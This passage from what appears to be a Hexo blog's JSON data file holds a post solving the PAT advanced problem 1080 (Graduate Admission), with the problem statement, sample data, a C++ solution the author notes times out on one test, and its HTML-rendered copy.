class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (i) <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> y = (x + i * i) % m;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!t[y])</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, y);</div><div class=\"line\">\t\t\t\tt[y] = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\tflag = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!flag) <span class=\"built_in\">printf</span>(<span class=\"string\">\"-\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//*/</span></div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1080","date":"2017-02-23T04:42:47.000Z","_content":"\n## Description\n\n> 1080.Graduate Admission\n\n> It is said that in 2013, there were about 100 graduate schools ready to proceed over 40,000 applications in Zhejiang Province. It would help a lot if you could write a program to automate the admission procedure.\n\n> Each applicant will have to provide two grades: the national entrance exam grade GE, and the interview grade GI. The final grade of an applicant is (GE + GI) / 2. The admission rules are:\n\n> The applicants are ranked according to their final grades, and will be admitted one by one from the top of the rank list.\nIf there is a tied final grade, the applicants will be ranked according to their national entrance exam grade GE. If still tied, their ranks must be the same.\nEach applicant may have K choices and the admission will be done according to his/her choices: if according to the rank list, it is one's turn to be admitted; and if the quota of one's most preferred shcool is not exceeded, then one will be admitted to this school, or one's other choices will be considered one by one in order. If one gets rejected by all of preferred schools, then this unfortunate applicant will be rejected.\nIf there is a tied rank, and if the corresponding applicants are applying to the same school, then that school must admit all the applicants with the same rank, even if its quota will be exceeded.\nInput Specification:\n\n> Each input file contains one test case. Each case starts with a line containing three positive integers: N (<=40,000), the total number of applicants; M (<=100), the total number of graduate schools; and K (<=5), the number of choices an applicant may have.\n\n> In the next line, separated by a space, there are M positive integers. The i-th integer is the quota of the i-th graduate school respectively.\n\n> Then N lines follow, each contains 2+K integers separated by a space. The first 2 integers are the applicant's GE and GI, respectively. The next K integers represent the preferred schools. For the sake of simplicity, we assume that the schools are numbered from 0 to M-1, and the applicants are numbered from 0 to N-1.\n\n> Output Specification:\n\n> For each test case you should output the admission results for all the graduate schools. The results of each school must occupy a line, which contains the applicants' numbers that school admits. The numbers must be in increasing order and be separated by a space. There must be no extra space at the end of each line. If no applicant is admitted by a school, you must output an empty line correspondingly.\n\n> Sample Input:\n11 6 3\n2 1 2 2 2 3\n100 100 0 1 2\n60 60 2 3 5\n100 90 0 3 4\n90 100 1 2 0\n90 90 5 1 3\n80 90 1 0 2\n80 80 0 1 2\n80 80 0 1 2\n80 70 1 3 2\n70 80 1 2 3\n100 100 0 2 4\n\n> Sample Output:\n0 10\n3\n5 6 7\n2 8\n\n> 1 4\n\n一个点超时了没过，以后再改\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 4e4 + 10;\nconst int maxM = 1e2 + 10;\nconst int maxK = 5;\n\nint n, m, k;\nstruct stu\n{\n\tint id;\n\tint e, i;\n\tint a[maxK];\n\tint g;\n\tint s;\n}stu[maxN];\nvector<int> ans[maxM];\n\nbool cmp(int a, int b)\n{\n\treturn stu[a].id < stu[b].id;\n}\n\nint main()\n{\n\tscanf(\"%d%d%d\", &n, &m, &k);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint x; scanf(\"%d\", &x);\n\t\tans[i].push_back(x);\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tstu[i].id = i;\n\t\tscanf(\"%d%d\", &stu[i].e, &stu[i].i);\n\t\tstu[i].s = stu[i].e + stu[i].i;\n\t\tfor (int j = 0; j < k; j++)\n\t\t\tscanf(\"%d\", &stu[i].a[j]);\n\t}\n\t//sort\n\tfor (int i = 0; i < n; i++)\n\t\tfor (int j = i; j < n; j++)\n\t\t\tif (stu[i].s < stu[j].s)\n\t\t\t\tswap(stu[i], stu[j]);\n\t\t\telse if (stu[i].s == stu[j].s && stu[i].e < stu[j].e)\n\t\t\t\tswap(stu[i], stu[j]);\n\tstu[0].g = 0;\n\tfor (int i = 1; i < n; i++)\n\t\tstu[i].g = (stu[i].s == stu[i - 1].s && stu[i].e == stu[i - 1].e) ? stu[i - 1].g : i;\n\t/***********************************************************/\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < k; j++)\n\t\t{\n\t\t\tif (ans[stu[i].a[j]][0] > 0)\n\t\t\t{\n\t\t\t\tans[stu[i].a[j]][0]--;\n\t\t\t\tans[stu[i].a[j]].push_back(i); // 压入录取学生排名\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (ans[stu[i].a[j]][0] <= 0 && stu[ans[stu[i].a[j]].back()].g == stu[i].g)\n\t\t\t{\n\t\t\t\tans[stu[i].a[j]][0]--;\n\t\t\t\tans[stu[i].a[j]].push_back(i);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t/*********************************************************/\n\tfor (int i = 0; i < m; i++)\n\t\tsort(ans[i].begin() + 1, ans[i].end(), cmp);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tfor (int j = 1; j < ans[i].size(); j++)\n\t\t\t(j == 1) ? printf(\"%d\", stu[ans[i][j]].id) : printf(\" %d\", stu[ans[i][j]].id);\n\t\tprintf(\"\\n\");\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1080.md","raw":"---\ntitle: PAT advanced 1080\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-23 12:42:47\n---\n\n## Description\n\n> 1080.Graduate Admission\n\n> It is said that in 2013, there were about 100 graduate schools ready to proceed over 40,000 applications in Zhejiang Province. It would help a lot if you could write a program to automate the admission procedure.\n\n> Each applicant will have to provide two grades: the national entrance exam grade GE, and the interview grade GI. The final grade of an applicant is (GE + GI) / 2. The admission rules are:\n\n> The applicants are ranked according to their final grades, and will be admitted one by one from the top of the rank list.\nIf there is a tied final grade, the applicants will be ranked according to their national entrance exam grade GE. If still tied, their ranks must be the same.\nEach applicant may have K choices and the admission will be done according to his/her choices: if according to the rank list, it is one's turn to be admitted; and if the quota of one's most preferred shcool is not exceeded, then one will be admitted to this school, or one's other choices will be considered one by one in order. If one gets rejected by all of preferred schools, then this unfortunate applicant will be rejected.\nIf there is a tied rank, and if the corresponding applicants are applying to the same school, then that school must admit all the applicants with the same rank, even if its quota will be exceeded.\nInput Specification:\n\n> Each input file contains one test case. Each case starts with a line containing three positive integers: N (<=40,000), the total number of applicants; M (<=100), the total number of graduate schools; and K (<=5), the number of choices an applicant may have.\n\n> In the next line, separated by a space, there are M positive integers. The i-th integer is the quota of the i-th graduate school respectively.\n\n> Then N lines follow, each contains 2+K integers separated by a space. The first 2 integers are the applicant's GE and GI, respectively. The next K integers represent the preferred schools. For the sake of simplicity, we assume that the schools are numbered from 0 to M-1, and the applicants are numbered from 0 to N-1.\n\n> Output Specification:\n\n> For each test case you should output the admission results for all the graduate schools. The results of each school must occupy a line, which contains the applicants' numbers that school admits. The numbers must be in increasing order and be separated by a space. There must be no extra space at the end of each line. If no applicant is admitted by a school, you must output an empty line correspondingly.\n\n> Sample Input:\n11 6 3\n2 1 2 2 2 3\n100 100 0 1 2\n60 60 2 3 5\n100 90 0 3 4\n90 100 1 2 0\n90 90 5 1 3\n80 90 1 0 2\n80 80 0 1 2\n80 80 0 1 2\n80 70 1 3 2\n70 80 1 2 3\n100 100 0 2 4\n\n> Sample Output:\n0 10\n3\n5 6 7\n2 8\n\n> 1 4\n\n一个点超时了没过，以后再改\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<algorithm>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 4e4 + 10;\nconst int maxM = 1e2 + 10;\nconst int maxK = 5;\n\nint n, m, k;\nstruct stu\n{\n\tint id;\n\tint e, i;\n\tint a[maxK];\n\tint g;\n\tint s;\n}stu[maxN];\nvector<int> ans[maxM];\n\nbool cmp(int a, int b)\n{\n\treturn stu[a].id < stu[b].id;\n}\n\nint main()\n{\n\tscanf(\"%d%d%d\", &n, &m, &k);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint x; scanf(\"%d\", &x);\n\t\tans[i].push_back(x);\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tstu[i].id = i;\n\t\tscanf(\"%d%d\", &stu[i].e, &stu[i].i);\n\t\tstu[i].s = stu[i].e + stu[i].i;\n\t\tfor (int j = 0; j < k; j++)\n\t\t\tscanf(\"%d\", &stu[i].a[j]);\n\t}\n\t//sort\n\tfor (int i = 0; i < n; i++)\n\t\tfor (int j = i; j < n; j++)\n\t\t\tif (stu[i].s < stu[j].s)\n\t\t\t\tswap(stu[i], stu[j]);\n\t\t\telse if (stu[i].s == stu[j].s && stu[i].e < stu[j].e)\n\t\t\t\tswap(stu[i], stu[j]);\n\tstu[0].g = 0;\n\tfor (int i = 1; i < n; i++)\n\t\tstu[i].g = (stu[i].s == stu[i - 1].s && stu[i].e == stu[i - 1].e) ? stu[i - 1].g : i;\n\t/***********************************************************/\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < k; j++)\n\t\t{\n\t\t\tif (ans[stu[i].a[j]][0] > 0)\n\t\t\t{\n\t\t\t\tans[stu[i].a[j]][0]--;\n\t\t\t\tans[stu[i].a[j]].push_back(i); // 压入录取学生排名\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (ans[stu[i].a[j]][0] <= 0 && stu[ans[stu[i].a[j]].back()].g == stu[i].g)\n\t\t\t{\n\t\t\t\tans[stu[i].a[j]][0]--;\n\t\t\t\tans[stu[i].a[j]].push_back(i);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t/*********************************************************/\n\tfor (int i = 0; i < m; i++)\n\t\tsort(ans[i].begin() + 1, ans[i].end(), cmp);\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tfor (int j = 1; j < ans[i].size(); j++)\n\t\t\t(j == 1) ? printf(\"%d\", stu[ans[i][j]].id) : printf(\" %d\", stu[ans[i][j]].id);\n\t\tprintf(\"\\n\");\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1080","published":1,"updated":"2017-02-23T04:46:07.442Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0s002ohv18vdi0k6mz","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1080.Graduate Admission</p>\n<p>It is said that in 2013, there were about 100 graduate schools ready to proceed over 40,000 applications in Zhejiang Province. It would help a lot if you could write a program to automate the admission procedure.</p>\n<p>Each applicant will have to provide two grades: the national entrance exam grade GE, and the interview grade GI. The final grade of an applicant is (GE + GI) / 2. The admission rules are:</p>\n<p>The applicants are ranked according to their final grades, and will be admitted one by one from the top of the rank list.<br>If there is a tied final grade, the applicants will be ranked according to their national entrance exam grade GE. If still tied, their ranks must be the same.<br>Each applicant may have K choices and the admission will be done according to his/her choices: if according to the rank list, it is one’s turn to be admitted; and if the quota of one’s most preferred shcool is not exceeded, then one will be admitted to this school, or one’s other choices will be considered one by one in order. If one gets rejected by all of preferred schools, then this unfortunate applicant will be rejected.<br>If there is a tied rank, and if the corresponding applicants are applying to the same school, then that school must admit all the applicants with the same rank, even if its quota will be exceeded.<br>Input Specification:</p>\n<p>Each input file contains one test case. Each case starts with a line containing three positive integers: N (&lt;=40,000), the total number of applicants; M (&lt;=100), the total number of graduate schools; and K (&lt;=5), the number of choices an applicant may have.</p>\n<p>In the next line, separated by a space, there are M positive integers. The i-th integer is the quota of the i-th graduate school respectively.</p>\n<p>Then N lines follow, each contains 2+K integers separated by a space. The first 2 integers are the applicant’s GE and GI, respectively. The next K integers represent the preferred schools. For the sake of simplicity, we assume that the schools are numbered from 0 to M-1, and the applicants are numbered from 0 to N-1.</p>\n<p>Output Specification:</p>\n<p>For each test case you should output the admission results for all the graduate schools. The results of each school must occupy a line, which contains the applicants’ numbers that school admits. The numbers must be in increasing order and be separated by a space. There must be no extra space at the end of each line. If no applicant is admitted by a school, you must output an empty line correspondingly.</p>\n<p>Sample Input:<br>11 6 3<br>2 1 2 2 2 3<br>100 100 0 1 2<br>60 60 2 3 5<br>100 90 0 3 4<br>90 100 1 2 0<br>90 90 5 1 3<br>80 90 1 0 2<br>80 80 0 1 2<br>80 80 0 1 2<br>80 70 1 3 2<br>70 80 1 2 3<br>100 100 0 2 4</p>\n<p>Sample Output:<br>0 10<br>3<br>5 6 7<br>2 8</p>\n<p>1 4</p>\n</blockquote>\n<p>一个点超时了没过，以后再改</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">4e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">1e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxK = <span class=\"number\">5</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m, k;</div><div class=\"line\"><span class=\"keyword\">struct</span> stu</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> id;</div><div class=\"line\">\t<span class=\"keyword\">int</span> e, i;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a[maxK];</div><div class=\"line\">\t<span class=\"keyword\">int</span> g;</div><div class=\"line\">\t<span class=\"keyword\">int</span> s;</div><div class=\"line\">&#125;stu[maxN];</div><div class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; ans[maxM];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">cmp</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">return</span> stu[a].id &lt; stu[b].id;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d\"</span>, &amp;n, &amp;m, &amp;k);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\tans[i].push_back(x);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tstu[i].id = i;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;stu[i].e, &amp;stu[i].i);</div><div class=\"line\">\t\tstu[i].s = stu[i].e + stu[i].i;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; k; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;stu[i].a[j]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//sort</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[i].s &lt; stu[j].s)</div><div class=\"line\">\t\t\t\tswap(stu[i], stu[j]);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (stu[i].s == stu[j].s &amp;&amp; stu[i].e &lt; stu[j].e)</div><div class=\"line\">\t\t\t\tswap(stu[i], stu[j]);</div><div class=\"line\">\tstu[<span class=\"number\">0</span>].g = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; n; i++)</div><div class=\"line\">\t\tstu[i].g = (stu[i].s == stu[i - <span class=\"number\">1</span>].s &amp;&amp; stu[i].e == stu[i - <span class=\"number\">1</span>].e) ? stu[i - <span class=\"number\">1</span>].g : i;</div><div class=\"line\">\t<span class=\"comment\">/***********************************************************/</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; k; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (ans[stu[i].a[j]][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]][<span class=\"number\">0</span>]--;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]].push_back(i); <span class=\"comment\">// 压入录取学生排名</span></div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ans[stu[i].a[j]][<span class=\"number\">0</span>] &lt;= <span class=\"number\">0</span> &amp;&amp; stu[ans[stu[i].a[j]].back()].g == stu[i].g)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]][<span class=\"number\">0</span>]--;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]].push_back(i);</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">/*********************************************************/</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\tsort(ans[i].begin() + <span class=\"number\">1</span>, ans[i].end(), cmp);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; ans[i].size(); j++)</div><div class=\"line\">\t\t\t(j == <span class=\"number\">1</span>) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, stu[ans[i][j]].id) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, stu[ans[i][j]].id);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1080.Graduate Admission</p>\n<p>It is said that in 2013, there were about 100 graduate schools ready to proceed over 40,000 applications in Zhejiang Province. It would help a lot if you could write a program to automate the admission procedure.</p>\n<p>Each applicant will have to provide two grades: the national entrance exam grade GE, and the interview grade GI. The final grade of an applicant is (GE + GI) / 2. The admission rules are:</p>\n<p>The applicants are ranked according to their final grades, and will be admitted one by one from the top of the rank list.<br>If there is a tied final grade, the applicants will be ranked according to their national entrance exam grade GE. If still tied, their ranks must be the same.<br>Each applicant may have K choices and the admission will be done according to his/her choices: if according to the rank list, it is one’s turn to be admitted; and if the quota of one’s most preferred shcool is not exceeded, then one will be admitted to this school, or one’s other choices will be considered one by one in order. If one gets rejected by all of preferred schools, then this unfortunate applicant will be rejected.<br>If there is a tied rank, and if the corresponding applicants are applying to the same school, then that school must admit all the applicants with the same rank, even if its quota will be exceeded.<br>Input Specification:</p>\n<p>Each input file contains one test case. Each case starts with a line containing three positive integers: N (&lt;=40,000), the total number of applicants; M (&lt;=100), the total number of graduate schools; and K (&lt;=5), the number of choices an applicant may have.</p>\n<p>In the next line, separated by a space, there are M positive integers. The i-th integer is the quota of the i-th graduate school respectively.</p>\n<p>Then N lines follow, each contains 2+K integers separated by a space. The first 2 integers are the applicant’s GE and GI, respectively. The next K integers represent the preferred schools. For the sake of simplicity, we assume that the schools are numbered from 0 to M-1, and the applicants are numbered from 0 to N-1.</p>\n<p>Output Specification:</p>\n<p>For each test case you should output the admission results for all the graduate schools. The results of each school must occupy a line, which contains the applicants’ numbers that school admits. The numbers must be in increasing order and be separated by a space. There must be no extra space at the end of each line. If no applicant is admitted by a school, you must output an empty line correspondingly.</p>\n<p>Sample Input:<br>11 6 3<br>2 1 2 2 2 3<br>100 100 0 1 2<br>60 60 2 3 5<br>100 90 0 3 4<br>90 100 1 2 0<br>90 90 5 1 3<br>80 90 1 0 2<br>80 80 0 1 2<br>80 80 0 1 2<br>80 70 1 3 2<br>70 80 1 2 3<br>100 100 0 2 4</p>\n<p>Sample Output:<br>0 10<br>3<br>5 6 7<br>2 8</p>\n<p>1 4</p>\n</blockquote>\n<p>一个点超时了没过，以后再改</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">4e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">1e2</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxK = <span class=\"number\">5</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, m, k;</div><div class=\"line\"><span class=\"keyword\">struct</span> stu</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> id;</div><div class=\"line\">\t<span class=\"keyword\">int</span> e, i;</div><div class=\"line\">\t<span class=\"keyword\">int</span> a[maxK];</div><div class=\"line\">\t<span class=\"keyword\">int</span> g;</div><div class=\"line\">\t<span class=\"keyword\">int</span> s;</div><div class=\"line\">&#125;stu[maxN];</div><div class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; ans[maxM];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">cmp</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span 